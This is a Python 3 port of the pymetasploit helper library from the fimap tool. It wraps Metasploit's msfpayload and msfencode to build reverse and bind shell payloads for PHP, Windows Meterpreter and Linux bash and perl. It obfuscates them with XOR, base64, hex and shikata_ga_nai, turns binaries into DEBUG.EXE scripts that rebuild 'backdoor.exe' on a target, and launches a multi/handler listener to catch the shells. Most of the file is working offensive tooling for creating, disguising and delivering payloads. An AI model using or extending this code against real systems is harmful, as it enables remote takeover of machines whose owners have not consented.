# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com
# Python3 port: 2026
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# Ported from original Python2 pymetasploit library bundled with fimap.
# Changes:
#   - Python3 syntax (print, except as, range, bytes/str)
#   - xmlrpclib -> xmlrpc.client
#   - base64/binascii return bytes -> decode to str
#   - subprocess universal_newlines=True
#   - Removed psyco (Python2 JIT, dead)
#   - xrange -> range
#   - MsfEncodeExecErr, MsfPayloadExecErr, MsfXmlRpcListenerErr unified

import base64
import binascii
import os
import re
import socket
import subprocess
import tempfile
import time
import xmlrpc.client


#=== Exceptions ================================================================

class MsfError(Exception):
    pass


#=== MsfObj — payload data holder ==============================================

class MsfObj:
    def __init__(self):
        self.requested_payload = ""
        self.params: list[str] = []
        self.payload = ""
        self.mode = ""

    def getRequestedPayload(self) -> str:   return self.requested_payload
    def getParams(self) -> list[str]:        return self.params
    def getPayload(self) -> str:             return self.payload
    def getMode(self) -> str:                return self.mode

    def setRequestedPayload(self, p: str):   self.requested_payload = p
    def setParams(self, p: list[str]):       self.params = p
    def setPayload(self, p: str):            self.payload = p
    def setMode(self, m: str):               self.mode = m


#=== MsfPayload — calls msfpayload CLI =========================================

class MsfPayload:
    def __init__(self, msf_obj: MsfObj):
        self.msf_obj = msf_obj

    def msfLoadPayload(self) -> None:
        err_gen = r"^Error generating payload:"
        invalid = r"^Invalid payload:"
        help_rx = r"Framework Payloads \(\d{1,} total\)"

        args = ["msfpayload", self.msf_obj.getRequestedPayload()]
        args.extend(self.msf_obj.getParams())
        args.append(self.msf_obj.getMode())

        proc = subprocess.run(
            args, capture_output=True, text=True, timeout=60,
        )

        stdout = proc.stdout or ""

        if (re.search(err_gen, stdout, re.MULTILINE)
                or re.search(invalid, stdout, re.MULTILINE)
                or re.search(help_rx, stdout, re.MULTILINE)):
            raise MsfError(
                "Error generating payload: %s %s"
                % (self.msf_obj.getRequestedPayload(),
                   " ".join(self.msf_obj.getParams()))
            )

        self.msf_obj.setPayload(stdout)


#=== MsfEncode — encodes payloads ==============================================

class MsfEncode:
    def __init__(self, msf_obj: MsfObj):
        self.msf_obj = msf_obj

    def toBase64(self) -> None:
        raw = self.msf_obj.getPayload()
        encoded = base64.b64encode(raw.encode("latin-1")).decode()
        self.msf_obj.setPayload(encoded)

    def toXor(self, key: str) -> None:
        payload = self.msf_obj.getPayload()
        crypt = bytearray()
        for i, ch in enumerate(payload):
            crypt.append(ord(ch) ^ ord(key[i % len(key)]))
        self.msf_obj.setPayload(crypt.decode("latin-1"))

    def toHex(self) -> None:
        raw = self.msf_obj.getPayload()
        self.msf_obj.setPayload(binascii.hexlify(raw.encode("latin-1")).decode())

    def toShikataGaNai(self, times: int = 1, arch: str = "x86") -> None:
        args = [
            "msfencode", "-c", str(times), "-a", str(arch),
            "-t", "exe", "-e", "x86/shikata_ga_nai",
        ]
        proc = subprocess.run(
            args, input=self.msf_obj.getPayload(),
            capture_output=True, text=True, timeout=120,
        )
        stdout = proc.stdout or ""
        if re.search(r"No encoders succeeded", stdout, re.MULTILINE):
            raise MsfError(
                "Error encoding payload: %s %s"
                % (self.msf_obj.getRequestedPayload(),
                   " ".join(self.msf_obj.getParams()))
            )
        self.msf_obj.setPayload(stdout)

    def toBash(self) -> None:
        self.toHex()
        payload = self.msf_obj.getPayload()
        bash = (
            "#! /bin/bash\n\n"
            'PAYLOAD="%s"\n'
            "echo -n -e $( echo $PAYLOAD | tr -d '[:space:]' "
            "| sed 's/../\\\\x&/g') > /tmp/uploaded"
        ) % payload
        self.msf_obj.setPayload(bash)

    def toWinDebug(self) -> None:
        """Encode payload as DEBUG.EXE script. Ported from Fast-Track 4.0."""

        fd_src, tmp_path = tempfile.mkstemp(prefix="pymetasploit")
        os.close(fd_src)
        fd_dst, temp_out = tempfile.mkstemp(prefix="pymetasploit")
        os.close(fd_dst)

        try:
            with open(tmp_path, "wb") as f:
                f.write(self.msf_obj.getPayload().encode("latin-1"))

            with open(tmp_path, "rb") as src, open(temp_out, "w") as dst:
                cx = src.seek(0, 2)
                src.seek(0, 0)

                if cx > 0xFFFF:
                    raise MsfError("filesize exceeds 64KB, quitting.")

                dst.write("DEL T 1>NUL 2>NUL\n")

                fc = 0
                chunk = 0
                while True:
                    data = src.read(16)
                    if not data:
                        footer = (
                            "echo RCX>>T\n"
                            "echo %X >>T\n"
                            "echo N T.BIN>>T\n"
                            "echo WDS:0>>T\n"
                            "echo Q>>T\n"
                            "DEBUG<T 1>NUL\n"
                            "MOVE T.BIN backdoor.exe"
                        ) % cx
                        dst.write(footer)
                        break

                    if data.count(b"\0") == 16:
                        fc += 1
                        chunk += 1
                    else:
                        if fc > 0:
                            dst.write(
                                "echo FDS:%X L %X 00>>T\n"
                                % ((chunk - fc) * 16, fc * 16)
                            )
                            fc = 0
                        hex_bytes = " ".join("%02X" % b for b in data)
                        dst.write("echo EDS:%X %s>>T\n" % (chunk * 16, hex_bytes))
                        chunk += 1

            with open(temp_out, "r") as f:
                self.msf_obj.setPayload(f.read())

        finally:
            os.unlink(tmp_path)
            os.unlink(temp_out)


#=== MsfWrapper — high-level API ===============================================

class MsfWrapper:
    def __init__(self):
        self.msf_obj = MsfObj()

    #--- payload configuration ------------------------------------------------

    def phpReverseShell(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("php/reverse_php")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("R")

    def phpBindShell(self, rhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("php/reverse_php")
        self.msf_obj.setParams(["RHOST=" + rhost, "LPORT=" + lport])
        self.msf_obj.setMode("R")

    def winMeterpreterReverseTcp(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("windows/meterpreter/reverse_tcp")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("X")

    def winMeterpreterReverseTcpRaw(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("windows/meterpreter/reverse_tcp")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("R")

    def linuxBindShell(self, lport: str) -> None:
        self.msf_obj.setRequestedPayload("linux/x86/shell_bind_tcp")
        self.msf_obj.setParams(["LPORT=" + lport])
        self.msf_obj.setMode("X")

    def linuxPerlReverseShell(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("cmd/unix/reverse_perl")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("R")

    def linuxBashReverseShell(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("cmd/unix/reverse_bash")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("R")

    def winShellReverseTcp(self, lhost: str, lport: str) -> None:
        self.msf_obj.setRequestedPayload("windows/shell_reverse_tcp")
        self.msf_obj.setParams(["LHOST=" + lhost, "LPORT=" + lport])
        self.msf_obj.setMode("X")

    #--- payload generation/encoding ------------------------------------------

    def createPayload(self) -> None:
        MsfPayload(self.msf_obj).msfLoadPayload()

    def encodeBase64(self) -> None:       MsfEncode(self.msf_obj).toBase64()
    def encodeXor(self, key: str) -> None: MsfEncode(self.msf_obj).toXor(key)
    def encodeHex(self) -> None:           MsfEncode(self.msf_obj).toHex()

    def encodeShikataGaNai(self, times: int = 1, arch: str = "x86") -> None:
        MsfEncode(self.msf_obj).toShikataGaNai(times, arch)

    def encodeWinDebug(self) -> None:      MsfEncode(self.msf_obj).toWinDebug()
    def encodeBash(self) -> None:          MsfEncode(self.msf_obj).toBash()

    def getPayload(self) -> str:
        return self.msf_obj.getPayload()

    def loadCustomPayload(self, payload: str) -> None:
        self.msf_obj.setPayload(payload)

    def loadCustomPayloadFromFile(self, path: str) -> None:
        with open(path, "rb") as f:
            self.msf_obj.setPayload(f.read().decode("latin-1"))


#=== MsfXmlRpcListener — XML-RPC to msfconsole ================================

class MsfXmlRpcListener:
    def __init__(self):
        self.payload = "cmd/unix/reverse_netcat"
        self.lport = "8080"
        self.lhost = "127.0.0.1"
        self.user = "msf"
        self.password = ""
        self.connection = None
        self.token = ""

    def setPassword(self, pw: str) -> None:   self.password = pw
    def getPassword(self) -> str:              return self.password
    def setUser(self, u: str) -> None:         self.user = u
    def getUser(self) -> str:                  return self.user
    def setLhost(self, h: str) -> None:        self.lhost = h
    def getLhost(self) -> str:                 return self.lhost
    def setLport(self, p: str) -> None:        self.lport = p
    def getLport(self) -> str:                 return self.lport
    def setPayload(self, p: str) -> None:       self.payload = p
    def getPayload(self) -> str:                return self.payload

    def login(self) -> None:
        self.connection = xmlrpc.client.ServerProxy("http://localhost:55553")
        try:
            ret = self.connection.auth.login(self.user, self.password)
            self.token = ret["token"]
            if ret["result"] != "success":
                raise MsfError("msfconsole login didn't return success")
        except socket.error as err:
            raise MsfError("Connection to msfconsole failed: %s" % err)
        except xmlrpc.client.Fault as err:
            raise MsfError("msfconsole login fault: %s" % err)

    def launchHandler(self) -> None:
        opts = {
            "LHOST": self.lhost,
            "LPORT": self.lport,
            "PAYLOAD": self.payload,
        }
        ret = self.connection.module.execute(
            self.token, "exploit", "exploit/multi/handler", opts,
        )
        if ret["result"] != "success":
            raise MsfError("Unexpected error while creating the listener")
        print("Sleeping before returning the created payload...")
        time.sleep(5)
